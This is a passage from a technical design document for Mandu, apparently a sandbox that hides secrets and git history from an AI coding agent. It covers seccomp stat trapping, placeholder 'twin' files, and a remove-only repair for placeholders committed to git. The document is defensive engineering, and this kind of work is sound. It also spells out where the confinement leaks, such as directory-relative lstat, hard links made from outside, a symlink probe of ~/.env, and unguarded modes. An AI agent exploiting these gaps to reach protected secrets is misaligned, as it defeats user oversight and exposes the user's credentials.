launcher's closure, "Stores shared through alternates" above; each real
directory inventoried once, a pack several repositories reach one copy),
is rebuilt on Linux (the only platform that serves these copies) without it into the launcher's
`cache/object-twins/` under the launcher's own key (`rebuildKey`), its index
rebuilt from content by `git index-pack` (step 2 above), and SEALED in the
current epoch. Nothing is built while the store honours no seal (an
unconfined launch is live: `paused`), and a copy is sealed only if its
build's epoch is still current at the end; after a rotation a copy whose
bytes still match what this process built (held in memory only) is
resealed without a rebuild. Every git call is hardened, sandboxed where
a git sandbox works (bubblewrap on Linux, Seatbelt on macOS), run with no user/system/repository config at nice 19,
and always settles (write-protection.md §8.2, §8.5, §8.5.1).

- **Budget.** One repository and one pack at a time; per cycle at most
  `MANDU_GIT_PREP_CYCLE_MB` of source packs (default the launcher's
  `MANDU_GIT_TWIN_MAX_MB`, else 1024 MiB), in total at most
  `MANDU_GIT_PREP_TOTAL_MB` (default 4096 MiB); over a cap a repository is
  `capped`, unfinished `pending`. Unwanted copies are removed unless a
  launch touched them in the last 10 minutes; a running launch touches
  every copy it serves every 4 minutes (`keepCopiesInUse`, 2026-10-17), so
  a lock added mid-session (a new key for the pack) no longer prunes the
  copy a guard-only session serves by path from under it.
  `MANDU_GIT_PREPARE=0` turns it off.
- **The answer.** `gitHistoryLocks` carries `prepared` and `preparation`
  (ready, pending, capped, failed, paused, bytes, caps), which `mandu doctor
  --secrets` prints.
- **The launch** (`git-object-twins.ts` `preparedCopyTwins`) treats
  `prepared` as a hint: it binds a copy only when it is present, its index
  lists no id excluded by the set it hands the guard, and each file matches
  a current-epoch seal by hash. A repository is all or nothing; bounded at
  16 repositories (`MANDU_GIT_PREPARED_REPOS`), 64 packs and 2 GiB hashed
  per launch.
- **The launch's own twins exclude the global set too** (`globalLocked`):
  a workspace pack's twin is served before the backstop, so it must lack
  every id the guard would refuse; the same exclusion gives the same key as
  the arbiter's copy, which is then the launch's cache hit.

Cost (a 36.6 MB pack, one id locked): a first cycle 2.4 to 2.5 s, mostly
`git index-pack`; an idle cycle 13 ms; a reseal 0.13 s; verifying a copy at
launch about 0.65 s per 500 MiB. Oracles:
`arbiter/test/unit/prepared-copies.test.ts`,
`arbiter/test/component/prepared-copies.test.ts`,
`launcher/test/unit/prepared-copies.test.ts`,
`tests/stack/prepared-copies-parity.test.ts`, and the kernel e2e K9, K10,
K11 and K14 (alternates two links deep) in
`tests/sandbox/git-history-locks.test.ts`.

**Guard-only metadata.** In the guard-only postures (`--no-secret-bind`, a
bubblewrap that forbids nesting such as stock Ubuntu 26.04's
`bwrap-userns-restrict`) the guard hands the twin's DESCRIPTOR to an open,
but a `stat` by path would reach the real file. Git compares exactly that:
`add_packed_git` takes the `.pack`'s `st_size` from a `stat` by path and
`open_packed_git_1` refuses the pack when `fstat` of the descriptor differs
("packfile … size changed"), so git dropped the WHOLE sanitized pack
(fail-closed, but git mostly stopped working). A credential twin is the
same class for a program that stats a path and reads exactly `st_size`
bytes. Where the guard serves twins with no bind, the launcher sets
`MANDU_NET_GUARD_STAT_TWINS=1` (`secret-setup.ts` `GUARD_STAT_TWINS_ENV`)
and the guard (`interceptors/net-supervisor/src/stat_twin.rs`) also traps
`stat`, `newfstatat` and `statx` unless `AT_EMPTY_PATH` is set on a real
descriptor (glibc's `fstat`), and an `AT_SYMLINK_NOFOLLOW` one (an
`lstat`, x86_64's `lstat` too) only when its path is relative to the cwd or
absolute (`AT_FDCWD`; "The size a reader sees", below). `AT_EMPTY_PATH` on
`AT_FDCWD` names no descriptor: the call is a stat of its path
(`statx(AT_FDCWD, ".env", AT_EMPTY_PATH)`) and is trapped as the same call
without the flag (2026-10-07). A path no name of a registered file can
reach continues at once ("Another name for a twinned file", below);
otherwise the guard resolves it once in the
tracee's view, matches the pinned file by path and identity
(`SecretIndex::lookup_opened`), and answers a registered file with its
TWIN's `struct stat`/`statx`, the same file `fstat` of the served
descriptor reports. Everything else is CONTINUEd to the kernel: a stat
returns metadata only, so no byte is read or handed over and the worst a
race buys is the real file's metadata. Except a caller the guard cannot
reach (2026-10-07): when the guard cannot read the caller's path or write
its buffer (a process that made itself non-dumpable, `prctl(PR_SET_DUMPABLE,
0)`), the stat is refused (`EFAULT`, or `EACCES` for the buffer) as that
caller's opens are, never continued to the real file's metadata.

**The size a reader sees** (2026-10-04). A reader that sizes its read by
a stat of the PATH, then opens it and reads exactly `st_size` bytes, read
the twin by the real file's size until the `lstat` trap: `git diff
--no-index /dev/null .env` (git `lstat`s, opens, `mmap`s `st_size`) printed
the twin cut mid-placeholder ("\ No newline at end of file"), found by
`printer-downstream` when git became a printer; `git grep --no-index` the
same; a twin SHORTER than its file (a long key) read past its end (NULs, a
"short read", or SIGBUS under `mmap` beyond the twin's last page). Nothing
leaked, but every reader of that shape (git's `diff`, `grep` and `add`,
`rsync`) saw a broken twin. The descriptor was never the problem: the guard
hands out the twin file itself, so `fstat`, `statx(AT_EMPTY_PATH)` and an
`mmap` sized by them were always the twin's. The fix is the path: the stat
trap above also answers an `lstat` relative to the cwd or absolute
(`guard_filter::LstatTrap::Cwd`, the default with the stat trap), the form
git, `rsync`, `ls -l`, Python's `os.lstat`, Rust's `symlink_metadata` and
libuv's `lstat` use; the guard resolves it with `O_NOFOLLOW`, so a symlink
of the same name is still the link. An `lstat` relative to a directory
descriptor (the fts walkers: `find`, `du`) still runs free (`LstatTrap::All`
traps it too, at their cost). `MANDU_NET_GUARD_LSTAT_TWINS=0` turns the
`lstat` trap off, `all` traps every form.

This also closes a small side channel: in the guard-only posture an `lstat`
of a registered file told any program the REAL file's size (the length of
the secret, give or take its format), which the bind never showed. Now
every stat by path but the fts form says the twin's size, as the bind does.

**Another name for a twinned file** (P0 4c, 2026-10-09). Until then the
guard resolved a trapped stat only when the path's LEAF was a registered
file's own name (`stat_twin::StatNames`, a set lookup). A symlink of
another name (`ln -s ~/.env /tmp/x; stat -L /tmp/x`, which the agent can
make itself) or a hard link of another name made before the launch reached
the same inode under a leaf the set did not know, and the kernel answered
the REAL file's size, mtime, ctime, inode number and link count (measured
in the kernel test below, before the fix: `stat`, `newfstatat`, `statx` and
x86_64's `stat` through a one- and a two-hop symlink, and every form
through the hard link). Keying on the file is the fix: the guard already
matches a resolved file by path and by `(st_dev, st_ino)`
(`SecretIndex::lookup_opened`, which also knows a twin's own inode), so
the only question is which stats to resolve. `stat_twin::stat_probe`
decides from the leaf alone:

| Leaf | Follows the final link (`stat`, `newfstatat`/`statx` without `AT_SYMLINK_NOFOLLOW`) | Does not (`lstat` forms) |
|---|---|---|
| a registered file's name | resolved | resolved |
| another name | resolved: a symlink of any name, one hop or many, or a `/proc` magic link, may lead to a registered file | resolved only while a registered file has `st_nlink > 1`; otherwise continued at once |
| none (empty, `/`, `.`, `..`) | continued: a directory | continued |

An `lstat` of a symlink is the link's own metadata, and a symlink in a
DIRECTORY component keeps the registered leaf, so without a second hard
link no `lstat` of another leaf can reach a registered file; the guard
refuses a hard link made in the session (the write family), so the count
grows only from outside the agent's tree, and `SecretIndex::any_linked`
reads it from the identity list the open path keeps (re-`stat`ed every
`ID_REFRESH`, 2 s; a hit in it stands only for an unchanged inode or one
the registered path still names, [`guard-file-identity.md`](guard-file-identity.md)
§1; a protected file is held by its inode, §2), not per
call. Whatever the leaf, the answer is the
twin's `struct stat`/`statx` (its size, times, inode and a link count of
1), as for the registered name; a bind mount of the file elsewhere is the
same inode and answers the same.

*Cost* (`stat_trap_cost_is_measured`, CI guest, Linux 6.8, 8 vCPUs,
2026-10-09, the same guest before and after): a FOLLOWING stat of another
name went from about 15.5 µs (let go by the leaf) to about 25 µs (resolved,
as a twinned name's ~25.5 µs), so +9 µs; an `lstat` of another name stays
at ~15.8 µs while no registered file has another link, and costs ~25 µs
while one has. `git status`, `find -size` and `ls -lR`
(`lstat_trap_cost_is_measured`: 31.8, 27.1 and 79.4 ms under `Cwd`, against
36.0, 25.8 and 76.0 before) make `lstat`s, so they are unchanged unless a
registered file is hard-linked; a Python start that imports three standard
modules makes about 300 following stats, so about 3 ms more. In the
guard-only posture only, as the stat trap itself.

*The bind posture* (2026-10-09). The bind covers one dentry, and no stat
is trapped there, so a hard link of another name made before the launch
showed the real file's size, times, inode and link count (`stat`, `stat
-L` and Python's `os.stat`/`os.lstat` of it in the agent's shell, under
the real launcher: 53 bytes, nlink 2, the real mtime, beside the twin's 50
under the registered name). The launcher now turns the stat trap on in
the bind posture too when a protected file (its resolved target) has
`st_nlink > 1` at launch (`secret-setup.ts` `linkedSecretFiles`; a count
it cannot read counts as linked) and says so in one launch line. Nothing
else changes: the guard runs OUTSIDE the bind, loads the same policy
file in both postures and builds its identity list in its own view, so
the list holds the real file's `(st_dev, st_ino)` and the twin's; a stat
through the bind reaches the twin's inode and one through the hard link
the real file's, and both answer the twin's metadata. A protected file
with one link keeps the trap off and the cost at nothing: the guard
refuses a hard link made in the session in both postures (the link family
is trapped under every secret policy), so the count grows only from
outside the agent's tree. Object-store files (packs a history lock
serves sanitized) are not counted: a local clone hard-links packs under
their own names, which would trap every stat of such a session for a
pack's size. *Cost* of that session (`lstat_trap_cost_is_measured`,
`none` against `Cwd+linked`, CI guest, Linux 6.8, two runs): `git status`
12 → 40 to 57 ms, `find -size` 30 → 34 to 36 ms, `ls -lR` 22 → 134 to
151 ms; each following stat and each `lstat` relative to the cwd goes from
under 1 µs to about 34 to 39 µs (`stat_trap_cost_is_measured`, linked).

*Out of reach:* an `lstat` relative to a directory descriptor (P0 4a,
below) of a hard link of another name runs free like any such `lstat`; a
name swapped between the guard's resolution and the kernel's continued
stat (a race the caller sets up, metadata only, as for the registered
name); in the bind posture, a hard link made after the launch from outside
the agent's tree (the launcher counted one link, so the trap is off); and
a pack's hard link of another name in the bind posture (not counted,
above).

**Cost.** About 20 µs per trapped stat the leaf lets go and 40 µs of a
twinned one, instead of under 1 µs (the guard's round trip; CI guest,
Linux 6.8, 2026-10-04; since P0 4c a following stat of another name is
resolved too, about as dear as a twinned one: "Another name for a twinned
file", above). In a repository of 3,000 tracked files
(`lstat_trap_cost_is_measured`, CI guest, 2026-10-04, the best of 9 runs
interleaved): `git status` 14.5 ms with `lstat` free, 46 ms with
`LstatTrap::Cwd` (about 10 µs per tracked file, git's index refresh runs
its `lstat`s on several threads), 37 ms with `All`; `find -size` unchanged
with `Cwd` (25 → 30 ms: it uses the directory-relative form), 5.8× with
`All`; `ls -lR` 21 → 79 ms (one `statx` relative to the cwd per file). In
that posture only: under the bind no stat is trapped. `Cwd` is the default
because the readers that size by a path use that form, it keeps the
guard-only posture's metadata the bind's, and `find`/`du` keep their speed;
a large repository in the guard-only posture that wants `git status` back
at full speed sets `MANDU_NET_GUARD_LSTAT_TWINS=0` and accepts the cut
twin.

*The round trip, and `SECCOMP_USER_NOTIF_FD_SYNC_WAKE_UP`* (2026-10-18,
measured, not adopted). Linux 6.6 added a listener flag
(`ioctl(listener, SECCOMP_IOCTL_NOTIF_SET_FLAGS,
SECCOMP_USER_NOTIF_FD_SYNC_WAKE_UP)`, unprivileged) that wakes the
supervisor on the trapped task's own CPU and the task on the answering
thread's, a hint for a supervisor that waits alone in `RECV`. Measured on
Linux 7.0 (128 CPUs, release build), each call timed one by one in a
tracee of the guard's test harness (`run_guarded_traps`, `LstatTrap::Cwd`,
the listener's flag set before the guard serves it; a one-off benchmark,
not kept in the tree), 5 runs of 15,000 calls per form, the range of the
runs' medians (p90):

| Call | Guard as it serves | With the flag |
|---|---|---|
| `lstat` of another name (continued at once: the round trip) | 13.9–15.0 µs (16.8–19.6) | 15.3–23.1 µs (24.6–29.6) |
| `lstat` of a twinned name (answered with the twin's metadata) | 22.5–25.9 µs (29.2–32.0) | 23.2–32.3 µs (35.0–41.3) |
| open + close the guard performs | 31.6–32.3 µs (37.5–43.2) | 28.7–38.2 µs (44.3–50.3) |
| `lstat` untrapped / `getppid` | 0.6–1.0 / 0.16–0.20 µs | the same |

and the walkers (`lstat_trap_cost_is_measured`, 3 runs): `git status`
under `Cwd` 43–51 → 46–55 ms, `find -size` under `All` 129–148 → 171–200
ms. The flag makes the guard slower because the wake is not exclusive:
every idle worker (`Workers::MIN` is 4, each waiting in `poll` or `RECV`
on the listener's one wait queue) is woken, and with the flag all of them
onto the caller's CPU, where one takes the notification and the others run
only to sleep again, ahead of the handler and the caller. A supervisor
that only continues shows the same split: one receiver 5.3–6.6 → 2.9–3.1
µs (blocking in `RECV`; 5.8–7.3 → 3.3–3.5 polling first), four receivers
6.0–8.6 → 7.2–8.9 µs. The guard cut to one worker for the experiment
(`MIN` = `MAX` = 1, 2 to 3 runs) does gain: the continued `lstat`
13.0–13.2 → 9.8–10.0 µs (p90 15.5–20.8 → 11.1–11.5), the twinned one
23.0–23.5 → 20.0–20.7,
`find -size` under `All` 93–111 → 69–85 ms; but `git status` 32–37 → 37–40
ms, since git's index refresh `lstat`s on several threads and one receiver
serves them in turn. So the flag pays only under a serving model with a
single receiver in the kernel at a time, which the pool exists to avoid (a
blocking open must not hold the other calls back, and parallel callers are
served in parallel); such a model, handing over to the pool only when a
handler blocks, would save about 3 µs a single-threaded caller's trapped
call and nothing for `git status`. The rest of a continued `lstat` (about
7 µs over a bare four-receiver round trip) is the guard's own work per
call: reading the path, the death watch's look, the probe.

**An open the guard performs.** The guard performs every open that can read
on a pinned descriptor (plan 10 §4.1a), including an `openat2` `O_PATH` on
an argument with a directory part (GNU tar once failed "Cannot stat:
Invalid argument" there). ADDFD cannot hand over an `O_PATH` descriptor,
so that open of a listable directory is answered with a read-only
descriptor of it, and of anything else `ENOSYS` (no `openat2`); an `open`/
`openat` `O_PATH` is the kernel's own (plan 10 §4.1a, step 4). GNU tar `lstat`s, opens, then `fstat`s the
descriptor and archives the twin with the twin's size
(`tests/sandbox/launcher/tar-twin.test.ts` in both postures,
`tests/sandbox/guard/tar-secret.test.ts`).

**Residual (metadata only).** An `lstat` relative to a directory
descriptor (`fstatat(dirfd, name, AT_SYMLINK_NOFOLLOW)`: `find`, `du`),
`AT_EMPTY_PATH` with a non-empty path relative to a real directory
descriptor, and, in the bind posture, a hard link of another name made
after the launch from outside the agent's tree see the real file's metadata, so its
size; a program that sizes its read that way reads the twin by the real
size (none of git, `rsync` or the size-checked readers measured does).
`AT_EMPTY_PATH` with a path on the cwd and a non-dumpable caller are closed
(2026-10-07, above), and a symlink or a hard link of another name in the
guard-only posture, and a hard link made before the launch in the bind
posture (P0 4c, 2026-10-09, above). Git
never reaches a pack those ways. A READER opened raw gets the real
descriptor while a stat of the path says the twin's size, as under the
bind: a reader that sizes its read by the path reads the real file cut at
the twin's size in both postures (none of the consumer table's readers
does: `ssh` and `curl` read to the end). A tracked file that is twinned
shows the twin's stat and bytes to git in both postures, so git there would
call it modified; since 2026-10-17, where the guard serves the twins and in the launch's own repositories, the launcher writes the twin's stat into
its index entry, and git in the session sees it unmodified until the agent
edits it ("A twinned file git tracks looks clean", below). Tests:
`stat_twin` and `guard_filter` units (`stat_probe`), `secret_open`'s
(`any_linked`), `guard_integration.rs` (every stat
form answered with the twin's size and inode, residuals pinned; under
another name, `a_stat_of_another_name_for_a_guard_only_twin_answers_the_twins_metadata`:
a one- and a two-hop symlink and a hard link made before the guard starts,
every form, the twin's size, times, inode and link count, red on the leaf
prefilter; in the bind posture,
`under_the_bind_a_hard_link_of_another_name_answers_the_twins_metadata`,
the hard link's real metadata without the trap and the twin's with it;
real git
reading a guard-only sanitized pack, each with the differential that
reproduces "size changed"; a reader sized by `fstat`, `stat`, `lstat`,
`statx(AT_SYMLINK_NOFOLLOW)` and `mmap` reads a longer and a shorter twin
whole, real `git diff`/`git grep --no-index` print it whole, with the
differential that reproduces the cut twin; the cost above), the e2e K4/K5
above, `tests/sandbox/guard/printer-downstream.test.ts` (git diff/grep
`--no-index` of a listed file print the twin whole),
`tests/sandbox/launcher/twin-format-fidelity.test.ts` F6 (git and Python
read two config twins whole under the real launcher, in both postures),
`launcher/test/unit/secret-setup.test.ts` (P0 4c: the trap on under the
bind for a hard-linked protected file, off for one link or no guard) and
`tests/sandbox/launcher/hard-link-twin-meta.test.ts` (the real launcher,
bind posture: both names of a hard-linked `.env` show the twin's size,
inode, link count and mtime; red before the launcher turned the trap on).

**A derived twin's descriptor** (2026-10-04, plan 13 D4). A file a holder
wrote during the session has no bind in either posture, so its twin is
always served by descriptor, on another inode: `lstat` of the path and
`fstat` of the descriptor disagree on `st_dev`/`st_ino`, and a reader that
checks them refuses the twin (Claude Code 2.1.288 reading a Bash call's
output back from its task file). The guard places a derived twin's
descriptor at number 768 or above (`stat_twin::TWIN_FD_BASE`), the filter
sends a descriptor stat on such a number to it (`fstat`; `newfstatat` and
`statx` with `AT_EMPTY_PATH`), and it answers a twin it made with the
twin's metadata carrying the derived file's identity; the size stays the
twin's. A registered file's twin is unchanged (its stat by path is the
twin's in this posture, the bind's under the bind). Tests:
`derived_label_integration.rs` (g), `tests/sandbox/guard/task-output-twin.test.ts`.

**Mandu's own copy.** In `secrets` mode (integrity OFF) no AgentView
worktree exists, so Mandu's shadow repositories (`~/.mandu/state/workspaces`,
whose `mdu-main` line holds raw snapshots of every tracked file) are
**hidden** with the whole home (below), even when no protected file was
found. In `full` mode the agent's cwd is a worktree of that repository, so
hiding it would break agent-side git; that half still needs the
object-store split (`fs-sync.md §3` §8).

**Mandu's own stores of originals** (`on-disk-layout.md` §4, §7). The
symbol DB (`symbols.value`, the original behind every placeholder from
every launch) and the event log (`DualRepr.original`) must not be readable
by a program the agent runs. An event keeps a value the model did not see
only in those HumanView fields (`original`, a symbol's `value`), never in
its `symbolized` form, a `symbolize` event's input and the reply filter's
terminal frame included (since 2026-10-06; dashboard.md §2.2, §4.2): the
dashboard's signed-out projection,
which a program the agent runs can read through the net-proxy's relay,
drops values by those fields (dashboard.md §6). In every launch with confidentiality on,
secrets found or not (`secret-setup.ts` `ownStoresHidden`), the rule is
**the whole Mandu home**: the guard's `denyPrefixes` hold the home's real
path (and the default `~/.mandu` when `MANDU_HOME` moves it) plus the
launch's scope `events/` and its egress CA private key; the wrap puts one
`--tmpfs` over the home before every secret-twin bind; Seatbelt denies it
by `subpath`. The frozen integrity modes carve their AgentView (and `full`
its `repo.git`) back out. A launch that confines no secret still hides
them (the guard's deny list, else a wrap started for them alone, even where
bubblewrap forbids nesting, with a WARNING). The arbiter creates the DB
`0600` in a `0700` home and the event dirs `0700`. An event log left by an
older layout outside the home (`~/.local/state/mandu/events`) is not
migrated and stays readable until deleted, a residual the user docs name.

**The arbiter's own answers** (`arbiter-human-plane.md`). Hiding the files
does not hide what the arbiter SAYS: `desymbolize` (deep and
label-unrestricted), shallow `resolve` and the event reads (`events`,
`subscribe`, `sessions`, `verifyEvents`) are refused on the data socket the
agent's tools reach and served on the human-plane socket
`<runtime>/human/<instance>.sock`, whose directory the launcher walls off
(the guard's always-deny unix entry, even with `MANDU_UNIX_POLICY=0`; a
`--tmpfs` in the wrap; a Seatbelt `network-outbound` deny; never an
`allowUnixSockets` entry). The human-facing consumers (reply filter,
fs-sync, net-proxy, net-supervisor, the dashboard) get its path as
`MANDU_ARBITER_HUMAN_SOCK`; the agent's environment never does, and none
falls back to the data socket. Deep `resolve` (the quarantined U-LLM) stays
on the data socket and refuses `no-model` whatever the axis says.

Proven by `launcher/test/kernel/own-stores-hidden.test.ts` (real arbiter,
production wrap; `secrets`, the `full` canary, and no secret found without
a guard), `guard_integration`
`own_stores_of_originals_are_refused_by_file_and_by_dir`,
`arbiter/test/unit/own-store-modes.test.ts`, and the `secret-setup` and
`secret-twins` unit tests. Residuals: in **`gated`** nothing can hide them
or the human-plane socket (`arbiter-human-plane.md` §8), and the posture
already says so; in **`full`** a DB companion created after the launch is
the guard's alone; **`off` and the frozen `injection` mode** add no denial,
so an agent under either can read originals a `secrets` launch confined
(recorded, not fixed: `off` promises nothing and `injection` is frozen).

**Fail-closed.** A repository whose history cannot be sanitized (a git
failure, an incremental multi-pack-index, more than `MANDU_GIT_TWIN_MAX_MB`
of packs to rebuild at this launch, default 1024) refuses the launch unless
`--best-effort`, like an arbiter failure (`confinement-posture.ts`
`onConfinementFailure`), and `--require-confinement` wins. Under
`--best-effort` the repositories are handled one at a time
(`continueOnFailure`): the one that fails is named in a WARNING and gets no
twin, and every other repository keeps its own (one over-cap repository
must not drop the twins of every other, which would leave a labeled file
readable through `git diff`).

**What it does not cover.** A protected version stored under an **earlier
path** (a rename) or copied into another file is not found by path (a blob
no tree names is found by the store scan's token rule only, above); objects
written **after** the launch (a `git fetch` bringing an old version back, a
commit of the file in the session: the twin's content is what would be
committed, said after the session as the next paragraph describes) are not
twinned until the next launch, and so are object
directories an `info/alternates` file or `GIT_ALTERNATE_OBJECT_DIRECTORIES`
names only after the launch (another repository's raw packs there are the
guard's backstop's, above; the arbiter's background preparation follows
the same closure, so it prepares them at its next cycle for the launch
after); macOS (no mount namespace) does not have this layer. Tests: `launcher/test/unit/git-object-twins.test.ts`,
`launcher/test/kernel/git-object-twins.test.ts` (real repository, packed
with a bitmap and a midx, loose and staged versions, read under the real
wrap), `secret-setup.test.ts` (wiring, fail-closed, the shadow mask),
`net-supervisor` `guard_integration.rs`
`object_store_twins_serve_sanitized_packs_deny_exposers_and_hide_shadow_repos`
(the guard-only posture), and `tests/stack/labeled-file-in-git.test.ts`
(the raw canary absent from git's own output in the agent's world).

**A placeholder in your repository (2026-10-10).** The twins hide what git
has stored; they do not stop git in the agent's world from storing a twin.
git there reads the twin of a protected file it tracks, finds it different
from the index, and `git commit -a`, `git add -A` / `git add .` or `git
stash` after ANY change stage the twin's bytes: the user's `.git` then holds
the placeholder in place of the file (protection-modes.md §8.5 finding 2;
verified 2026-10-09 in the mount layer with a tracked `.env` and a
`policy.yaml`-labelled `settings.ini`; in the guard git is a printer and
gets the twin of a file with no reader list, plan 10 §2.4). Since
2026-10-17 an UNEDITED twin of a tracked file whose real bytes are its
index blob looks unmodified to git there where the guard serves the twins ("A twinned file git tracks looks
clean", below), so those commands leave it out; once the agent edits the
twin (or under the bind alone, or where a launch could not patch the index), the above holds. A protected
file git does not track goes in the same way through `git add -A` / `git
add .` (or `git add -f` when `.gitignore` names it) and a commit; `git
commit -a` and a plain `git stash` skip untracked files. git there never
reads the secret, so what it records is the placeholder. The harm is to
the user's history: outside the session `git status` shows the real file
modified, a `git checkout -- <file>`, `git
restore <file>` or `git reset --hard` there writes the placeholder over the
real file, and a push spreads it. A `readers:` list without `others: twin`
makes the guard refuse git (plan 10 §3.3), so a whole-tree add fails
loudly, but only with the guard and only for a file with a list.

The launcher says so, from outside the agent's world
(`launcher/src/placeholder-commits.ts`). At launch, beside the history
twins (both only read git): for each twinned file inside a git work tree,
tracked or not (an untracked one is watched whether `.gitignore` names it
or not: `git add -A` takes the first, `git add -f`, or a `.gitignore` line
the agent removes, the second), the ids `git add` can store for its twin
(its bytes, and its bytes with CRLF turned into LF, each as SHA-1 and
SHA-256, what `git hash-object --no-filters` gives, computed without a git
call), its index entries (`ls-files -s`), and the repository's tips
(`rev-list --all --no-walk`). Each of these calls is cut off after 5 s
(`WATCH_GIT_TIMEOUT_MS`): the watch is advisory and must not hold up a
launch on a slow repository. The record goes to
`state/object-walks/placeholder-checks/` in the Mandu home (on-disk-layout.md
§3), where the agent can neither read nor write it. After the agent exits,
the index entries of those paths (`ls-files -s`) and the commits added
since the tips (`log --raw -m --full-history --stdin` from the new tips,
the old ones excluded; `--full-history` so that a side branch merged away,
say with `-s ours`, is walked too) are looked up for those ids, and for
the twin's bytes at that moment (an edit the agent made to it); on a hit,
HEAD, its tree and the refs holding each commit (`for-each-ref
--contains`, six commits at most) say where it is. One WARNING block per
repository names the files, staged or in which commit (its branch, the
stash, a remote it already reached), the repair, and what not to run
before it: `git checkout`, `git restore` of the work tree, `git reset
--hard` and `git stash`. Never a value: only ids, paths and commit names
are read or printed, and a ref name is printed with its control
characters shown as `?` (the agent can name refs). A placeholder already
staged at launch is not said again.

**The repair only removes.** No command the warning prints puts any
version of the file into git: not the file on disk (never `git add`, never
a commit with `-a` or a pathspec, each of which takes the real file) and
not a version from another commit or branch (never `--source`, a checkout
or a reset). Each command takes the placeholder out of git's record, and
nothing comes back in its place, so following them as printed cannot copy
a protected file's content into the history, whatever the check or a
record got wrong. Two earlier builds of this check (2026-10-10, never
released) each printed a repair that could. The first counted a file in
the index at launch as tracked and printed `git add -- <file>`: a
never-tracked `.env` whose placeholder a killed session had staged was in
the index at the next launch, and when that session's agent committed,
the `git add` and the amend put the REAL value in HEAD. The second
restored the version the launch's checked-out commit held (`git restore
--staged --source=<commit>`); once the agent had moved HEAD to another
branch (a checkout, or `symbolic-ref` and `reset`) and committed there,
that copied the real file from a local-only branch onto the branch being
repaired, ready to be pushed. Rather than a third rule for when a version
may come back, none ever does.

In order: first what is only staged leaves the index. `git restore
--staged -- <file>` sets its index entry back to what the checked-out
commit itself holds (content already in that branch's history; a
placeholder of this session's there is a committed one, below), or drops
it where that commit holds none. On a branch with no commit yet, where there is no
HEAD to restore from, `git rm --cached -f -- <file>` (`-f` because that
staged placeholder differs from both the file and the missing HEAD, which
plain `git rm --cached` refuses; `--cached` leaves the file alone). That
comes first because the commit after it takes the whole index: when the
agent's `git commit -a` put one file's placeholder in HEAD and a later
`git add -A` staged another's, unstaging last would have committed the
second placeholder. Then a placeholder in the checked-out commit leaves
the index, `git rm --cached -f -- <file>`, and `git commit --amend
--no-edit --allow-empty` records that when HEAD is one of the session's
commits and no remote holds it, as far as `for-each-ref --contains` could
tell (a new commit otherwise, and also when that call failed; the warning
then says where the commit is could not be read, never "on no branch").
The commit names no path: `git commit -- <file>` would commit the work
tree's copy of the file, the real one. A file git tracked before the
session is untracked by this too, so the warning says that git no longer
tracks it; that if it belongs in git, the user checks what the file on
disk holds and adds it back, knowing that what goes in is the real file;
that Mandu prints no command that puts it back; and otherwise to list it
in `.gitignore` (out of git and not ignored, a later `git add -A` would
take its real value). A commit the commands do not replace (an older one,
one on another branch or in the stash, HEAD once pushed) is named, with
the remotes that already hold it; taking the placeholder out of it means
rewriting history, which the warning leaves to the user, with no command
for it (and, for another branch, not to merge it as it is, nor check it
out, which can write the placeholder over the real file).

What the commit records is the index once the placeholders are out, so
other work staged there goes in with it: the warning says to check `git
status` first. The commands run the user's own git in that repository,
with whatever hooks, config, replace refs or merge in progress the
repository holds, and the agent could have written those (guarantees.md,
"Every file that runs later"; `git status` names a merge in progress).
The warning says only what the check verified: that what git recorded is
the placeholder (by its id), not that git holds no secret, nor that the
file on disk is unchanged. A HEAD that is not plainly unborn is never
taken for one: only `rev-parse -q --verify` answering "no such commit"
(exit 1, nothing printed, not cut off) on a branch `symbolic-ref` names,
whose ref `show-ref --verify -q` finds absent (a ref to a missing commit
is 128 there; an empty, unreadable or garbled one already fails
`symbolic-ref`), so `git rm --cached` is never printed for a file only
staged that HEAD may hold.

A record whose launcher is gone (its pid, that process's start time and
the boot) is checked at the next launch, after its secret setup (whose
store-link check refuses a store in the home swapped for a link outside
it), and printed there. That check is bounded: each call 5 s (the walk
included), and once 15 s are spent (`PENDING_LAUNCH_BUDGET_MS`) no
further record, nor repository of a record, is started (the first of each
always is). A record not started waits on disk for the next launch. One
whose check completed is removed; one whose check did not (a call failed
or was cut off, or one of its repositories was not started) stays on disk,
so that a launch killed in turn loses nothing. After the agent exits,
every earlier record the launch checked is checked AGAIN, in full, against
the repository as it is then (the agent may have committed on top; a
full-screen agent may have painted over what was said), and said again
unless the launch's own check just said the very same for that
repository: a block that says something else is never dropped. Then a
record kept on disk is removed. Since no block's commands put anything
back, none copies a protected file's content into git, whatever order the
user runs them in and however late (a stale one at worst takes a file out
of git again that the user has since added back). The check
reads, writes and removes records only while `placeholder-checks/` and
`object-walks/` are real directories (no symlink in their place), the
user's own, inside the Mandu home, and makes that folder one level at a
time from the home down, each level checked before the next is made in it
(so a store swapped for a link is never followed by a `mkdir`). It touches
only files named as records: a record of another version (a newer
launcher's) is left for it, and one of this version it cannot read is
dropped. A field it does not know is ignored: a record of an earlier build
of this check (the first's `tracked` flag; the second's `source` commit
and `headPlaceholder` flag) reads as the same files without them and gets
the same remove-only repair.

Every git call is the hardened, sandboxed runner (write-protection.md §8).
The cost is bounded: only repositories holding such a file (16 at most),
two calls each at launch (`ls-files -s`, `rev-list`; at most 5 s each),
two or three at exit, a few more on a hit.
It is advisory: it never refuses or changes a launch (a watch that fails is
dropped), and a commit pushed in the same session is already out (the
warning says which remote holds it).
Not caught: a clean filter (Git LFS, git-crypt) that changes the twin on
its way into git, an edit of the twin committed and then edited again (only
the launch's and the final bytes are known), and a commit no ref holds at
the check. An unprotected launch the arbiter could not record deletes
`state/object-walks/` when it ends (on-disk-layout.md §3), pending records
included. Tests: `launcher/test/unit/placeholder-commits.test.ts` (each
repair run as printed with real git and then the leak oracle: the real
value in no ref's tip that moved, not in the index, and in no commit
reachable from a ref that did not hold it before. Cases: the mixed
HEAD-and-staged case, an unborn branch and the HEADs that are not one, a
side branch merged away; TWO SESSIONS, a never-tracked file staged by a
killed session and committed by the next, with the same and a changed
symbol, and a tracked file the killed session committed over, with a newer
value on disk; THE BRANCH SWITCH, the real `.env` only on a local branch
and the agent's commit on another, in one session and across a killed one
whose real version the user purged in between, with a record of each
earlier build. Also: every printed command, for 576 findings of every
shape, parsed by the real shell, is never `git add`, `--source`, a
checkout, a switch, a reset, a restore without `--staged`, or a commit
with `-a` or a pathspec; the watch's two short calls; the pending budget
between records and between repositories, and a record kept until its
check completes; the record folder swapped for a link, never read, written
or made through it. With the first build's `git add` or the second's
`--source` put back, the oracle fails), `launcher/test/unit/secret-setup.test.ts`
(the watch's wiring; a failing watch never refuses the launch), and
`tests/sandbox/placeholder-commit-warning.test.ts` (the real launcher and
